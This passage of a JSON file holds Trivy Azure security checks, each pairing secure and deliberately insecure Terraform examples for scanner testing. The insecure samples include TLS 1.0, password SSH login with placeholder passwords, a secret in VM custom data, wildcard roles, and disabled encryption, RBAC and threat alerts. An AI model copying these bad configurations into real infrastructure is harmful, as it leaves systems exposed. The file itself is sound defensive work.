              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  site_config {\n    http2_enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-ENFORCE_HTTPS",
        "title": "Enforce Https",
        "provider": "azure",
        "service": "appservice",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/function_app#https_only\n  good:\n    - |-\n      resource \"azurerm_function_app\" \"good_example\" {\n        name                       = \"test-azure-functions\"\n        location                   = azurerm_resource_group.example.location\n        resource_group_name        = azurerm_resource_group.example.name\n        app_service_plan_id        = azurerm_app_service_plan.example.id\n        storage_account_name       = azurerm_storage_account.example.name\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        os_type                    = \"linux\"\n        https_only                 = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_function_app\" \"bad_example\" {\n        name                       = \"test-azure-functions\"\n        location                   = azurerm_resource_group.example.location\n        resource_group_name        = azurerm_resource_group.example.name\n        app_service_plan_id        = azurerm_app_service_plan.example.id\n        storage_account_name       = azurerm_storage_account.example.name\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        os_type                    = \"linux\"\n      }\n",
        "file_name": "enforce_https.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/enforce_https.yaml",
        "local_path": "azure/appservice/enforce_https.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/function_app#https_only"
            ],
            "good": [
              "resource \"azurerm_function_app\" \"good_example\" {\n  name                       = \"test-azure-functions\"\n  location                   = azurerm_resource_group.example.location\n  resource_group_name        = azurerm_resource_group.example.name\n  app_service_plan_id        = azurerm_app_service_plan.example.id\n  storage_account_name       = azurerm_storage_account.example.name\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  os_type                    = \"linux\"\n  https_only                 = true\n}"
            ],
            "bad": [
              "resource \"azurerm_function_app\" \"bad_example\" {\n  name                       = \"test-azure-functions\"\n  location                   = azurerm_resource_group.example.location\n  resource_group_name        = azurerm_resource_group.example.name\n  app_service_plan_id        = azurerm_app_service_plan.example.id\n  storage_account_name       = azurerm_storage_account.example.name\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  os_type                    = \"linux\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-REQUIRE_CLIENT_CERT",
        "title": "Require Client Cert",
        "provider": "azure",
        "service": "appservice",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#client_cert_enabled\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n        client_cert_enabled = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n        client_cert_enabled = false\n      }\n",
        "file_name": "require_client_cert.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/require_client_cert.yaml",
        "local_path": "azure/appservice/require_client_cert.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#client_cert_enabled"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  client_cert_enabled = true\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}",
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  client_cert_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "azure",
        "service": "appservice",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#min_tls_version\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        site_config {\n          min_tls_version = \"1.2\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        site_config {\n          min_tls_version = \"1.0\"\n        }\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/use_secure_tls_policy.yaml",
        "local_path": "azure/appservice/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#min_tls_version"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}",
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  site_config {\n    min_tls_version = \"1.2\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  site_config {\n    min_tls_version = \"1.0\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-AUTHORIZATION-LIMIT_ROLE_ACTIONS",
        "title": "Limit Role Actions",
        "provider": "azure",
        "service": "authorization",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions\n  good:\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions     = [\"*\"]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n  bad:\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions     = [\"*\"]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          \"/\"\n        ]\n      }\n",
        "file_name": "limit_role_actions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/authorization/limit_role_actions.yaml",
        "local_path": "azure/authorization/limit_role_actions.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions"
            ],
            "good": [
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions     = [\"*\"]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}"
            ],
            "bad": [
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions     = [\"*\"]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    \"/\"\n  ]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-AUTHORIZATION-PREVENT_CUSTOM_ROLE_CREATION",
        "title": "Prevent Custom Role Creation",
        "provider": "azure",
        "service": "authorization",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions\n  good:\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions = [\n            \"Microsoft.Authorization/roleDefinitions/read\",\n            \"Microsoft.Resources/subscriptions/resourceGroups/read\",\n            \"Microsoft.Storage/storageAccounts/read\"\n          ]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n  bad:\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions = [\n            \"Microsoft.Authorization/roleDefinitions/write\"\n          ]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions = [\n            \"Microsoft.Authorization/*\"\n          ]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions = [\n            \"*\"\n          ]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n",
        "file_name": "prevent_custom_role_creation.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/authorization/prevent_custom_role_creation.yaml",
        "local_path": "azure/authorization/prevent_custom_role_creation.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions"
            ],
            "good": [
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions = [\n      \"Microsoft.Authorization/roleDefinitions/read\",\n      \"Microsoft.Resources/subscriptions/resourceGroups/read\",\n      \"Microsoft.Storage/storageAccounts/read\"\n    ]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}"
            ],
            "bad": [
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions = [\n      \"Microsoft.Authorization/roleDefinitions/write\"\n    ]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}",
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions = [\n      \"Microsoft.Authorization/*\"\n    ]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}",
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions = [\n      \"*\"\n    ]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-COMPUTE-DISABLE_PASSWORD_AUTHENTICATION",
        "title": "Disable Password Authentication",
        "provider": "azure",
        "service": "compute",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/linux_virtual_machine#disable_password_authentication\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#disable_password_authentication\n  good:\n    - |-\n      resource \"azurerm_linux_virtual_machine\" \"good_linux_example\" {\n        name                = \"good-linux-machine\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        size                = \"Standard_F2\"\n        admin_username      = \"adminuser\"\n        admin_password      = \"somePassword\"\n\n        admin_ssh_key {\n          username   = \"adminuser\"\n          public_key = file(\"~/.ssh/id_rsa.pub\")\n        }\n      }\n    - |-\n      resource \"azurerm_virtual_machine\" \"good_example\" {\n        name                = \"good-linux-machine\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        size                = \"Standard_F2\"\n        admin_username      = \"adminuser\"\n\n\n        os_profile_linux_config {\n          ssh_keys = [{\n            key_data = file(\"~/.ssh/id_rsa.pub\")\n            path     = \"~/.ssh/id_rsa.pub\"\n          }]\n\n          disable_password_authentication = true\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_linux_virtual_machine\" \"bad_linux_example\" {\n        name                            = \"bad-linux-machine\"\n        resource_group_name             = azurerm_resource_group.example.name\n        location                        = azurerm_resource_group.example.location\n        size                            = \"Standard_F2\"\n        admin_username                  = \"adminuser\"\n        admin_password                  = \"somePassword\"\n        disable_password_authentication = false\n      }\n    - |-\n      resource \"azurerm_virtual_machine\" \"bad_example\" {\n        name                = \"bad-linux-machine\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        size                = \"Standard_F2\"\n        admin_username      = \"adminuser\"\n        admin_password      = \"somePassword\"\n\n        os_profile {\n          computer_name  = \"hostname\"\n          admin_username = \"testadmin\"\n          admin_password = \"Password1234!\"\n        }\n\n        os_profile_linux_config {\n          disable_password_authentication = false\n        }\n      }\n",
        "file_name": "disable_password_authentication.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/compute/disable_password_authentication.yaml",
        "local_path": "azure/compute/disable_password_authentication.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/linux_virtual_machine#disable_password_authentication",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#disable_password_authentication"
            ],
            "good": [
              "resource \"azurerm_linux_virtual_machine\" \"good_linux_example\" {\n  name                = \"good-linux-machine\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  size                = \"Standard_F2\"\n  admin_username      = \"adminuser\"\n  admin_password      = \"somePassword\"\n\n  admin_ssh_key {\n    username   = \"adminuser\"\n    public_key = file(\"~/.ssh/id_rsa.pub\")\n  }\n}",
              "resource \"azurerm_virtual_machine\" \"good_example\" {\n  name                = \"good-linux-machine\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  size                = \"Standard_F2\"\n  admin_username      = \"adminuser\"\n\n\n  os_profile_linux_config {\n    ssh_keys = [{\n      key_data = file(\"~/.ssh/id_rsa.pub\")\n      path     = \"~/.ssh/id_rsa.pub\"\n    }]\n\n    disable_password_authentication = true\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_linux_virtual_machine\" \"bad_linux_example\" {\n  name                            = \"bad-linux-machine\"\n  resource_group_name             = azurerm_resource_group.example.name\n  location                        = azurerm_resource_group.example.location\n  size                            = \"Standard_F2\"\n  admin_username                  = \"adminuser\"\n  admin_password                  = \"somePassword\"\n  disable_password_authentication = false\n}",
              "resource \"azurerm_virtual_machine\" \"bad_example\" {\n  name                = \"bad-linux-machine\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  size                = \"Standard_F2\"\n  admin_username      = \"adminuser\"\n  admin_password      = \"somePassword\"\n\n  os_profile {\n    computer_name  = \"hostname\"\n    admin_username = \"testadmin\"\n    admin_password = \"Password1234!\"\n  }\n\n  os_profile_linux_config {\n    disable_password_authentication = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-COMPUTE-ENABLE_DISK_ENCRYPTION",
        "title": "Enable Disk Encryption",
        "provider": "azure",
        "service": "compute",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/managed_disk\n  good:\n    - |-\n      resource \"azurerm_managed_disk\" \"good_example\" {\n        encryption_settings {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_managed_disk\" \"bad_example\" {\n        encryption_settings {\n          enabled = false\n        }\n      }\n",
        "file_name": "enable_disk_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/compute/enable_disk_encryption.yaml",
        "local_path": "azure/compute/enable_disk_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/managed_disk"
            ],
            "good": [
              "resource \"azurerm_managed_disk\" \"good_example\" {\n  encryption_settings {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_managed_disk\" \"bad_example\" {\n  encryption_settings {\n    enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-COMPUTE-NO_SECRETS_IN_CUSTOM_DATA",
        "title": "No Secrets In Custom Data",
        "provider": "azure",
        "service": "compute",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#custom_data\n  good:\n    - |-\n      resource \"azurerm_virtual_machine\" \"good_example\" {\n        name = \"good_example\"\n        os_profile_linux_config {\n          disable_password_authentication = false\n        }\n        os_profile {\n          custom_data = <<EOF\n      \t\t\texport GREETING=\"Hello there\"\n      \t\t\tEOF\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_virtual_machine\" \"bad_example\" {\n        name = \"bad_example\"\n        os_profile_linux_config {\n          disable_password_authentication = false\n        }\n        os_profile {\n          custom_data = <<EOF\n      \t\t\texport DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n      \t\t\tEOF\n        }\n      }\n",
        "file_name": "no_secrets_in_custom_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/compute/no_secrets_in_custom_data.yaml",
        "local_path": "azure/compute/no_secrets_in_custom_data.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#custom_data"
            ],
            "good": [
              "resource \"azurerm_virtual_machine\" \"good_example\" {\n  name = \"good_example\"\n  os_profile_linux_config {\n    disable_password_authentication = false\n  }\n  os_profile {\n    custom_data = <<EOF\n\t\t\texport GREETING=\"Hello there\"\n\t\t\tEOF\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_virtual_machine\" \"bad_example\" {\n  name = \"bad_example\"\n  os_profile_linux_config {\n    disable_password_authentication = false\n  }\n  os_profile {\n    custom_data = <<EOF\n\t\t\texport DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n\t\t\tEOF\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-CONTAINER-CONFIGURED_NETWORK_POLICY",
        "title": "Configured Network Policy",
        "provider": "azure",
        "service": "container",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#network_policy\n  good:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        network_profile {\n          network_policy = \"calico\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n        network_profile {\n        }\n      }\n",
        "file_name": "configured_network_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/container/configured_network_policy.yaml",
        "local_path": "azure/container/configured_network_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#network_policy"
            ],
            "good": [
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  network_profile {\n    network_policy = \"calico\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n  network_profile {\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-CONTAINER-LIMIT_AUTHORIZED_IPS",
        "title": "Limit Authorized Ips",
        "provider": "azure",
        "service": "container",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#authorized_ip_ranges\n  good:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        api_server_access_profile {\n          authorized_ip_ranges = [\n            \"1.2.3.4/32\"\n          ]\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n      }\n",
        "file_name": "limit_authorized_ips.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/container/limit_authorized_ips.yaml",
        "local_path": "azure/container/limit_authorized_ips.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#authorized_ip_ranges"
            ],
            "good": [
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  api_server_access_profile {\n    authorized_ip_ranges = [\n      \"1.2.3.4/32\"\n    ]\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-CONTAINER-LOGGING",
        "title": "Logging",
        "provider": "azure",
        "service": "container",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#oms_agent\n  good:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        addon_profile {\n          oms_agent {\n            enabled = true\n          }\n        }\n      }\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        oms_agent {\n          log_analytics_workspace_id = \"whatever\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n        addon_profile {}\n      }\n",
        "file_name": "logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/container/logging.yaml",
        "local_path": "azure/container/logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#oms_agent"
            ],
            "good": [
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  addon_profile {\n    oms_agent {\n      enabled = true\n    }\n  }\n}",
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  oms_agent {\n    log_analytics_workspace_id = \"whatever\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n  addon_profile {}\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-CONTAINER-USE_RBAC_PERMISSIONS",
        "title": "Use Rbac Permissions",
        "provider": "azure",
        "service": "container",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://www.terraform.io/docs/providers/azurerm/r/kubernetes_cluster.html#role_based_access_control\n  good:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        // azurerm < 2.99.0\n        role_based_access_control {\n          enabled = true\n        }\n      }\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        // azurerm >= 2.99.0\n        role_based_access_control_enabled = true\n      }\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"aks_cluster\" {\n        name                = \"example-aks1\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        default_node_pool {\n          name    = \"default\"\n          vm_size = \"Standard_D2_v2\"\n        }\n\n        azure_active_directory_role_based_access_control {\n          managed                = true\n          azure_rbac_enabled     = true\n          admin_group_object_ids = [data.azuread_group.aks_admins.object_id]\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n        // azurerm < 2.99.0\n        role_based_access_control {\n          enabled = false\n        }\n      }\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n        // azurerm >= 2.99.0\n        role_based_access_control_enabled = false\n      }\n",
        "file_name": "use_rbac_permissions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/container/use_rbac_permissions.yaml",
        "local_path": "azure/container/use_rbac_permissions.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://www.terraform.io/docs/providers/azurerm/r/kubernetes_cluster.html#role_based_access_control"
            ],
            "good": [
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  // azurerm < 2.99.0\n  role_based_access_control {\n    enabled = true\n  }\n}",
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  // azurerm >= 2.99.0\n  role_based_access_control_enabled = true\n}",
              "resource \"azurerm_kubernetes_cluster\" \"aks_cluster\" {\n  name                = \"example-aks1\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  default_node_pool {\n    name    = \"default\"\n    vm_size = \"Standard_D2_v2\"\n  }\n\n  azure_active_directory_role_based_access_control {\n    managed                = true\n    azure_rbac_enabled     = true\n    admin_group_object_ids = [data.azuread_group.aks_admins.object_id]\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n  // azurerm < 2.99.0\n  role_based_access_control {\n    enabled = false\n  }\n}",
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n  // azurerm >= 2.99.0\n  role_based_access_control_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-ALL_THREAT_ALERTS_ENABLED",
        "title": "All Threat Alerts Enabled",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#disabled_alerts\n  good:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts            = []\n        retention_days             = 20\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts = [\n          \"Sql_Injection\",\n          \"Data_Exfiltration\"\n        ]\n        retention_days = 20\n      }\n",
        "file_name": "all_threat_alerts_enabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/all_threat_alerts_enabled.yaml",
